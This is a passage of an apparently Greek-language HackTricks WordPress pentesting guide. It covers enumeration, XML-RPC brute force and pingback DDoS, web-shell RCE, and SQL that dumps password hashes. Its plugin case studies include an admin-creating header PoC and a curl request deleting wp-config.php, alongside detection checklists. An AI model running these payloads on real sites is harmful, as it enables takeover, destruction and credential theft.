# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

- **Uploaded** αρχεία πηγαίνουν στο: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Τα αρχεία των Themes μπορούν να βρεθούν στο /wp-content/themes/,** οπότε αν αλλάξετε κάποιο php του theme για να αποκτήσετε RCE πιθανότατα θα χρησιμοποιήσετε αυτό το path. Για παράδειγμα: Χρησιμοποιώντας **theme twentytwelve** μπορείτε να **έχετε πρόσβαση** στο αρχείο **404.php** στο: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Άλλο χρήσιμο url θα μπορούσε να είναι:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Στο **wp-config.php** μπορείτε να βρείτε τον root κωδικό της βάσης δεδομένων.
- Προεπιλεγμένες διαδρομές login προς έλεγχο: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Κύρια αρχεία του WordPress**

- `index.php`
- `license.txt` περιέχει χρήσιμες πληροφορίες όπως η έκδοση του WordPress που είναι εγκατεστημένη.
- `wp-activate.php` χρησιμοποιείται για τη διαδικασία ενεργοποίησης μέσω email κατά τη δημιουργία ενός νέου WordPress site.
- Φάκελοι login (μπορεί να μετονομαστούν για να κρυφτούν):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` είναι ένα αρχείο που αντιπροσωπεύει μια λειτουργία του WordPress που επιτρέπει τη μετάδοση δεδομένων με HTTP ως μηχανισμό μεταφοράς και XML ως μηχανισμό κωδικοποίησης. Αυτός ο τύπος επικοινωνίας έχει αντικατασταθεί από το WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Ο φάκελος `wp-content` είναι ο κύριος κατάλογος όπου αποθηκεύονται plugins και themes.
- `wp-content/uploads/` είναι ο κατάλογος όπου αποθηκεύονται τυχόν αρχεία που ανεβάζονται στην πλατφόρμα.
- `wp-includes/` είναι ο κατάλογος όπου αποθηκεύονται αρχεία core, όπως πιστοποιητικά, γραμματοσειρές, αρχεία JavaScript και widgets.
- `wp-sitemap.xml` Στις εκδόσεις WordPress 5.5 και άνω, το WordPress παράγει ένα sitemap XML αρχείο με όλα τα δημόσια posts και τους τύπους περιεχομένου και ταξινομήσεις που είναι δημόσια ερωτήσιμες.

**Μετά την εκμετάλλευση**

- Το αρχείο `wp-config.php` περιέχει πληροφορίες που απαιτούνται από το WordPress για τη σύνδεση με τη βάση δεδομένων, όπως το όνομα βάσης, το database host, username και password, authentication keys και salts, και το database table prefix. Αυτό το αρχείο ρυθμίσεων μπορεί επίσης να χρησιμοποιηθεί για να ενεργοποιήσει το DEBUG mode, που μπορεί να είναι χρήσιμο στην επίλυση προβλημάτων.

### Δικαιώματα Χρηστών

- **Administrator**
- **Editor**: Δημοσιεύει και διαχειρίζεται τις αναρτήσεις του και άλλων.
- **Author**: Δημοσιεύει και διαχειρίζεται τις δικές του αναρτήσεις.
- **Contributor**: Γράφει και διαχειρίζεται τις αναρτήσεις του αλλά δεν μπορεί να τις δημοσιεύσει.
- **Subscriber**: Περιηγείται τις αναρτήσεις και επεξεργάζεται το προφίλ του.

## **Παθητική Αναγνώριση**

### **Βρείτε την έκδοση του WordPress**

Ελέγξτε αν μπορείτε να βρείτε τα αρχεία `/license.txt` ή `/readme.html`

Μέσα στον **πηγαίο κώδικα** της σελίδας (παράδειγμα από [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Αρχεία συνδέσεων CSS

![](<../../images/image (533).png>)

- Αρχεία JavaScript

![](<../../images/image (524).png>)

### Λήψη πρόσθετων
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Λήψη θεμάτων
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Εξαγωγή εκδόσεων γενικά
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Ενεργή αναγνώριση

### Plugins and Themes

Πιθανότατα δεν θα καταφέρετε να βρείτε όλα τα Plugins and Themes. Για να τα ανακαλύψετε όλα, θα χρειαστεί να **κάνετε ενεργά Brute Force σε μια λίστα με Plugins and Themes** (ελπίζουμε ότι υπάρχουν αυτοματοποιημένα εργαλεία που περιέχουν αυτές τις λίστες).

### Χρήστες

- **ID Brute:** Αποκτάτε έγκυρους χρήστες από ένα WordPress site κάνοντας Brute Forcing των users IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Εάν οι αποκρίσεις είναι **200** ή **30X**, αυτό σημαίνει ότι το id είναι **έγκυρο**. Εάν η απόκριση είναι **400**, τότε το id είναι **άκυρο**.

- **wp-json:** Μπορείτε επίσης να προσπαθήσετε να λάβετε πληροφορίες για τους χρήστες υποβάλλοντας ερώτημα:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Άλλο endpoint `/wp-json/` που μπορεί να αποκαλύψει μερικές πληροφορίες για χρήστες είναι:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Σημειώστε ότι αυτό το endpoint εκθέτει μόνο χρήστες που έχουν κάνει μία δημοσίευση. **Μόνο πληροφορίες για τους χρήστες που έχουν ενεργοποιημένη αυτή τη λειτουργία θα παρέχονται**.

Επίσης σημειώστε ότι **/wp-json/wp/v2/pages** θα μπορούσε να leak διευθύνσεις IP.

- **Login username enumeration**: Κατά το login στο **`/wp-login.php`** το **μήνυμα** είναι **διαφορετικό** και δείχνει εάν το **username** υπάρχει ή όχι.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία[ using this](https://github.com/relarizky/wpxploit) for example).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**Έλεγχος**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** είναι μερικές από τις μεθόδους που μπορούν να χρησιμοποιηθούν για brute-force credentials. Αν μπορείτε να βρείτε οποιαδήποτε από αυτές, μπορείτε να στείλετε κάτι σαν:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Το μήνυμα _"Incorrect username or password"_ μέσα σε απάντηση με κωδικό 200 πρέπει να εμφανίζεται αν τα credentials δεν είναι έγκυρα.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Χρησιμοποιώντας τα σωστά credentials μπορείτε να ανεβάσετε ένα αρχείο. Στην απάντηση θα εμφανιστεί η διαδρομή ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Επιπλέον υπάρχει ένας **πιο γρήγορος τρόπος** για να brute-force credentials χρησιμοποιώντας **`system.multicall`**, αφού μπορείτε να δοκιμάσετε πολλαπλά creds στο ίδιο request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Παράκαμψη 2FA**

Αυτή η μέθοδος προορίζεται για προγράμματα και όχι για ανθρώπους, και είναι παλιά, γι' αυτό δεν υποστηρίζει 2FA. Έτσι, αν έχετε έγκυρα creds αλλά η κύρια είσοδος προστατεύεται με 2FA, **μπορεί να καταφέρετε να καταχραστείτε το xmlrpc.php για να κάνετε login με αυτά τα creds παρακάμπτοντας 2FA**. Σημειώστε ότι δεν θα μπορείτε να εκτελέσετε όλες τις ενέργειες που μπορείτε να κάνετε μέσω της κονσόλας, αλλά μπορεί παρ' όλα αυτά να καταφέρετε να φτάσετε σε RCE όπως εξηγεί ο Ippsec στο [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ή port scanning**

Αν μπορείτε να βρείτε τη μέθοδο _**pingback.ping**_ μέσα στη λίστα μπορείτε να κάνετε το Wordpress να στείλει ένα αυθαίρετο request σε οποιονδήποτε host/port.\
Αυτό μπορεί να χρησιμοποιηθεί για να ζητήσετε από **χιλιάδες** Wordpress **sites** να **access** μία **τοποθεσία** (οπότε προκαλείται **DDoS** σε εκείνη την τοποθεσία) ή μπορείτε να το χρησιμοποιήσετε για να κάνετε το **Wordpress** να **scan** κάποιο εσωτερικό **network** (μπορείτε να υποδείξετε οποιαδήποτε port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Αν λάβεις το **faultCode** με τιμή **μεγαλύτερη** από **0** (17), αυτό σημαίνει ότι η θύρα είναι ανοιχτή.

Ρίξε μια ματιά στη χρήση του **`system.multicall`** στην προηγούμενη ενότητα για να μάθεις πώς να καταχραστείς αυτή τη μέθοδο ώστε να προκαλέσεις DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Αυτό το αρχείο συνήθως υπάρχει στη ρίζα του Wordpress site: **`/wp-cron.php`**\
Όταν αυτό το αρχείο προσπελαύνεται εκτελείται ένα "**βαρύ**" MySQL **query**, οπότε μπορεί να χρησιμοποιηθεί από attackers για να προκαλέσει **DoS**.\
Επίσης, εξ ορισμού, το `wp-cron.php` καλείται σε κάθε φόρτωση σελίδας (κάθε φορά που ένας client ζητά οποιαδήποτε Wordpress σελίδα), κάτι που σε sites υψηλής επισκεψιμότητας μπορεί να προκαλέσει προβλήματα (DoS).

Συνιστάται να απενεργοποιήσετε το Wp-Cron και να δημιουργήσετε ένα πραγματικό cronjob στον host που θα εκτελεί τις απαραίτητες ενέργειες σε τακτά διαστήματα (χωρίς να προκαλεί προβλήματα).

### /wp-json/oembed/1.0/proxy - SSRF

Δοκιμάστε να προσπελάσετε _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ και το Worpress site ενδέχεται να κάνει ένα αίτημα προς εσάς.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Αυτό το εργαλείο ελέγχει αν υπάρχει το **methodName: pingback.ping** και η διαδρομή **/wp-json/oembed/1.0/proxy** και αν υπάρχουν, προσπαθεί να τα εκμεταλλευτεί.

## Αυτόματα εργαλεία
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Απόκτηση πρόσβασης επανεγγράφοντας ένα bit

Περισσότερο παρά μια πραγματική επίθεση, πρόκειται για μια περιέργεια. Στο CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) μπορούσες να flip 1 bit σε οποιοδήποτε wordpress αρχείο. Έτσι μπορούσες να flip τη θέση `5389` του αρχείου `/var/www/html/wp-includes/user.php` ώστε να NOP το NOT (`!`) operation.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Τροποποίηση ενός php από το θέμα που χρησιμοποιείται (απαιτούνται διαπιστευτήρια admin)**

Εμφάνιση → Επεξεργαστής Θέματος → 404 Template (στα δεξιά)

Αλλάξτε το περιεχόμενο σε ένα php shell:

![](<../../images/image (384).png>)

Αναζητήστε στο διαδίκτυο πώς μπορείτε να αποκτήσετε πρόσβαση σε αυτή την ενημερωμένη σελίδα. Σε αυτή την περίπτωση πρέπει να αποκτήσετε πρόσβαση εδώ: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Μπορείτε να χρησιμοποιήσετε:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
να αποκτήσετε session.

## Plugin RCE

### PHP plugin

Ενδέχεται να είναι δυνατό να ανεβάσετε αρχεία .php ως plugin.\
Δημιουργήστε το php backdoor σας χρησιμοποιώντας, για παράδειγμα:

![](<../../images/image (183).png>)

Στη συνέχεια προσθέστε ένα νέο plugin:

![](<../../images/image (722).png>)

Ανεβάστε το plugin και πατήστε Install Now:

![](<../../images/image (249).png>)

Κάντε κλικ στο Procced:

![](<../../images/image (70).png>)

Πιθανότατα αυτό δεν θα κάνει τίποτα εμφανώς, αλλά αν μεταβείτε στο Media, θα δείτε το shell σας ανεβασμένο:

![](<../../images/image (462).png>)

Ανοίγοντάς το θα δείτε το URL για να εκτελέσετε το reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Αυτή η μέθοδος περιλαμβάνει την εγκατάσταση ενός κακόβουλου plugin γνωστού ότι είναι ευάλωτο και μπορεί να εκμεταλλευτεί για να αποκτήσει web shell. Αυτή η διαδικασία εκτελείται μέσω του WordPress dashboard ως εξής:

1. **Plugin Acquisition**: Το plugin αποκτάται από μια πηγή όπως το Exploit DB όπως [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Ανεβάστε το zip αρχείο του κατεβασμένου plugin.
3. **Plugin Activation**: Αφού το plugin εγκατασταθεί επιτυχώς, πρέπει να ενεργοποιηθεί μέσω του dashboard.
4. **Exploitation**:
- Με το plugin "reflex-gallery" εγκατεστημένο και ενεργοποιημένο, μπορεί να εκμεταλλευτεί καθώς είναι γνωστό ότι είναι ευάλωτο.
- Το Metasploit framework παρέχει ένα exploit για αυτή την ευπάθεια. Φορτώνοντας το κατάλληλο module και εκτελώντας συγκεκριμένες εντολές, μπορεί να δημιουργηθεί μια meterpreter session, παρέχοντας μη εξουσιοδοτημένη πρόσβαση στον ιστότοπο.
- Σημειώνεται ότι αυτός είναι μόνο ένας από τους πολλούς τρόπους για να εκμεταλλευτείτε έναν WordPress ιστότοπο.

Το περιεχόμενο περιλαμβάνει οπτικά βοηθήματα που απεικονίζουν τα βήματα στο WordPress dashboard για την εγκατάσταση και ενεργοποίηση του plugin. Ωστόσο, είναι σημαντικό να σημειωθεί ότι η εκμετάλλευση ευπαθειών με αυτόν τον τρόπο είναι παράνομη και ανήθικη χωρίς την κατάλληλη εξουσιοδότηση. Αυτές οι πληροφορίες πρέπει να χρησιμοποιούνται υπεύθυνα και μόνο σε νομικό πλαίσιο, όπως penetration testing με ρητή άδεια.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ είναι ένα script σχεδιασμένο να κλιμακώνει μια **Cross-Site Scripting (XSS)** ευπάθεια σε **Remote Code Execution (RCE)** ή άλλες κρίσιμες ευπάθειες σε WordPress. Για περισσότερες πληροφορίες δείτε [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Παρέχει **υποστήριξη για Wordpress Versions 6.X.X, 5.X.X and 4.X.X. και επιτρέπει:**
- _**Privilege Escalation:**_ Creates an user in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edit a Built-In Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edit a Built-In Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits for Third-Party WordPress Plugins/Themes.

## Post Exploitation

Εξαγωγή usernames και passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Αλλαγή κωδικού admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Επιφάνεια Επίθεσης

Η γνώση του πώς ένα Wordpress plugin μπορεί να εκθέσει λειτουργικότητα είναι κρίσιμη για τον εντοπισμό ευπαθειών στη λειτουργικότητά του. Μπορείτε να δείτε πώς ένα plugin ενδέχεται να εκθέσει λειτουργικότητα στα παρακάτω σημεία και μερικά παραδείγματα ευπαθών plugins στο [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Ένας από τους τρόπους με τους οποίους ένα Wordpress plugin μπορεί να εκθέσει συναρτήσεις στους χρήστες είναι μέσω των AJAX handlers. Αυτές μπορούν να περιέχουν σφάλματα στη λογική, authorization, ή authentication. Επιπλέον, είναι αρκετά συχνό αυτές οι συναρτήσεις να βασίζουν τόσο την authentication όσο και την authorization στην ύπαρξη ενός wordpress nonce το οποίο **οποιοσδήποτε authenticated χρήστης στην Wordpress instance μπορεί να έχει** (ανεξάρτητα από το ρόλο του).

Αυτές είναι οι συναρτήσεις που μπορούν να χρησιμοποιηθούν για να εκθέσουν μια λειτουργία σε ένα plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Η χρήση του `nopriv` καθιστά το endpoint προσβάσιμο από οποιονδήποτε χρήστη (ακόμη και μη αυθεντικοποιημένους).**

> [!CAUTION]
> Επιπλέον, αν η συνάρτηση απλώς ελέγχει την εξουσιοδότηση του χρήστη με τη συνάρτηση `wp_verify_nonce`, αυτή η συνάρτηση απλώς ελέγχει ότι ο χρήστης είναι συνδεδεμένος, δεν ελέγχει συνήθως το ρόλο του χρήστη. Έτσι χρήστες με χαμηλά προνόμια μπορεί να έχουν πρόσβαση σε ενέργειες υψηλών προνομίων.

- **REST API**

Είναι επίσης δυνατό να εκθέσετε συναρτήσεις από το wordpress καταχωρώντας ένα rest AP χρησιμοποιώντας τη συνάρτηση `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Η `permission_callback` είναι μια συνάρτηση callback που ελέγχει αν ένας δεδομένος χρήστης έχει εξουσιοδότηση να καλέσει τη μέθοδο API.

**Αν χρησιμοποιηθεί η ενσωματωμένη συνάρτηση `__return_true`, θα παραλείψει απλά τον έλεγχο δικαιωμάτων του χρήστη.**

- **Άμεση πρόσβαση στο αρχείο PHP**

Φυσικά, Wordpress χρησιμοποιεί PHP και τα αρχεία μέσα σε plugins είναι άμεσα προσβάσιμα από το web. Έτσι, εάν ένα plugin εκθέτει κάποια ευάλωτη λειτουργία που ενεργοποιείται απλώς με την πρόσβαση στο αρχείο, θα είναι εκμεταλλεύσιμη από οποιονδήποτε χρήστη.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Ορισμένα plugins υλοποιούν συντομεύσεις “trusted header” για εσωτερικές ενσωματώσεις ή reverse proxies και στη συνέχεια χρησιμοποιούν αυτό το header για να ορίσουν το τρέχον context χρήστη για αιτήματα REST. Εάν το header δεν είναι κρυπτογραφικά δεμένο με το αίτημα από ένα upstream component, ένας επιτιθέμενος μπορεί να το ψευδοποιήσει και να προσπελάσει προνομιούχες REST routes ως administrator.

- Αντίκτυπος: μη-επαληθευμένη κλιμάκωση προνομίων σε administrator, δημιουργώντας νέο administrator μέσω του core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (εξαναγκάζει user ID 1, συνήθως τον πρώτο administrator λογαριασμό).
- Exploited route: `POST /wp-json/wp/v2/users` με έναν πίνακα ρόλων με αυξημένα δικαιώματα.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Γιατί λειτουργεί

- Το plugin αντιστοιχίζει ένα header που ελέγχεται από τον client στην κατάσταση αυθεντικοποίησης και παραλείπει τους ελέγχους capability.
- Το WordPress core αναμένει την capability `create_users` για αυτό το route· το plugin hack την παρακάμπτει θέτοντας απευθείας το current user context από το header.

Προσδοκώμενοι δείκτες επιτυχίας

- HTTP 201 με JSON σώμα που περιγράφει τον δημιουργημένο χρήστη.
- Ένας νέος admin χρήστης ορατός στο `wp-admin/users.php`.

Λίστα ελέγχου ανίχνευσης

- Κάντε grep για `getallheaders()`, `$_SERVER['HTTP_...']`, ή vendor SDKs που διαβάζουν custom headers για να ορίσουν το user context (π.χ. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Ελέγξτε τις εγγραφές REST για privileged callbacks που στερούνται ισχυρών ελέγχων `permission_callback` και αντ' αυτού βασίζονται σε request headers.
- Αναζητήστε χρήσεις των core user-management functions (`wp_insert_user`, `wp_create_user`) μέσα σε REST handlers που προστατεύονται μόνο από τιμές header.

### Αυθαίρετη Διαγραφή Αρχείων από Μη Αυθεντικοποιημένο Χρήστη μέσω wp_ajax_nopriv (Litho Theme <= 3.0)

Τα WordPress themes και plugins συχνά εκθέτουν AJAX handlers μέσω των hooks `wp_ajax_` και `wp_ajax_nopriv_`. Όταν χρησιμοποιείται η παραλλαγή **_nopriv_** **η callback γίνεται προσβάσιμη από μη αυθεντικοποιημένους επισκέπτες**, οπότε κάθε ευαίσθητη ενέργεια πρέπει επιπλέον να υλοποιεί:

1. Έναν **έλεγχο capability** (π.χ. `current_user_can()` ή τουλάχιστον `is_user_logged_in()`), και
2. Ένα **CSRF nonce** επικυρωμένο με `check_ajax_referer()` / `wp_verify_nonce()`, και
3. **Αυστηρή απολύμανση / επαλήθευση εισόδων**.

Το Litho multipurpose theme (< 3.1) ξέχασε αυτούς τους 3 ελέγχους στην *Remove Font Family* λειτουργία και τελικά παρέδωσε τον παρακάτω κώδικα (απλουστευμένος):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Προβλήματα που εισάγονται από αυτό το απόσπασμα:

* **Μη αυθεντικοποιημένη πρόσβαση** – το `wp_ajax_nopriv_` hook έχει καταχωρηθεί.
* **Χωρίς nonce / έλεγχο δικαιωμάτων** – οποιοσδήποτε επισκέπτης μπορεί να προσπελάσει το endpoint.
* **Χωρίς sanitisation διαδρομής** – η από τον χρήστη ελεγχόμενη συμβολοσειρά `fontfamily` συγχωνεύεται σε διαδρομή του filesystem χωρίς φιλτράρισμα, επιτρέποντας το κλασικό `../../` traversal.

#### Εκμετάλλευση

Ένας επιτιθέμενος μπορεί να διαγράψει οποιοδήποτε αρχείο ή κατάλογο **κάτω από τον βασικό κατάλογο uploads** (συνήθως `<wp-root>/wp-content/uploads/`) στέλνοντας ένα μόνο HTTP POST αίτημα:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Επειδή `wp-config.php` βρίσκεται έξω από το *uploads*, τέσσερις αλληλουχίες `../` είναι αρκετές σε μια προεπιλεγμένη εγκατάσταση. Η διαγραφή του `wp-config.php` αναγκάζει το WordPress στον *οδηγό εγκατάστασης* στην επόμενη επίσκεψη, επιτρέποντας πλήρη κατάληψη του site (ο επιτιθέμενος απλώς παρέχει μια νέα DB διαμόρφωση και δημιουργεί έναν admin χρήστη).

Άλλοι σημαντικοί στόχοι περιλαμβάνουν plugin/theme αρχεία `.php` (για να σπάσουν πρόσθετα ασφαλείας) ή κανόνες `.htaccess`.

#### Λίστα ελέγχου ανίχνευσης

* Οποιοδήποτε callback `add_action( 'wp_ajax_nopriv_...')` που καλεί βοηθητικά για το filesystem (`copy()`, `unlink()`, `$wp_filesystem->delete()`, κ.λπ.).
* Συνένωση μη φιλτραρισμένης εισόδου χρήστη σε μονοπάτια (ψάξτε για `$_POST`, `$_GET`, `$_REQUEST`).
* Έλλειψη `check_ajax_referer()` και `current_user_can()`/`is_user_logged_in()`.

---

### Αύξηση προνομίων μέσω επαναφοράς παλαιών ρόλων και έλλειψης εξουσιοδότησης (ASE "View Admin as Role")

Πολλά plugins υλοποιούν λειτουργία "view as role" ή προσωρινής αλλαγής ρόλου αποθηκεύοντας τον/τους αρχικό/ους ρόλο/ους στο user meta ώστε να μπορούν να επαναφερθούν αργότερα. Αν το μονοπάτι επαναφοράς εξαρτάται μόνο από παραμέτρους αίτησης (π.χ. `$_REQUEST['reset-for']`) και από μια λίστα που διατηρεί το plugin χωρίς έλεγχο δυνατοτήτων (capabilities) και έγκυρου nonce, αυτό μετατρέπεται σε κάθετη αύξηση προνομίων.

Ένα πραγματικό παράδειγμα βρέθηκε στο Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). Το branch επαναφοράς έφερνε πίσω ρόλους βάσει `reset-for=<username>` αν το όνομα χρήστη εμφανιζόταν σε έναν εσωτερικό πίνακα `$options['viewing_admin_as_role_are']`, αλλά δεν εκτελούσε ούτε `current_user_can()` έλεγχο ούτε επαλήθευση nonce πριν αφαιρέσει τους τρέχοντες ρόλους και ξαναπροσθέσει τους αποθηκευμένους ρόλους από το user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Γιατί είναι εκμεταλλεύσιμο

- Εμπιστεύεται το `$_REQUEST['reset-for']` και μια επιλογή plugin χωρίς εξουσιοδότηση στην πλευρά του server.
- Αν ένας χρήστης προηγουμένως είχε υψηλότερα προνόμια αποθηκευμένα στο `_asenha_view_admin_as_original_roles` και υποβαθμίστηκε, μπορεί να τα επαναφέρει προσεγγίζοντας τη διαδρομή επαναφοράς.
- Σε κάποιες εγκαταστάσεις, οποιοσδήποτε πιστοποιημένος χρήστης θα μπορούσε να προκαλέσει επαναφορά για άλλο όνομα χρήστη που εξακολουθεί να υπάρχει στο `viewing_admin_as_role_are` (σφάλμα εξουσιοδότησης).

Εκμετάλλευση (παράδειγμα)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Σε ευάλωτες builds αυτό αφαιρεί τα current roles και επαναπροσθέτει τα αποθηκευμένα original roles (π.χ. `administrator`), αποτελεσματικά escalating privileges.

Detection checklist

- Αναζητήστε role-switching features που αποθηκεύουν “original roles” σε user meta (π.χ. `_asenha_view_admin_as_original_roles`).
- Εντοπίστε reset/restore paths που:
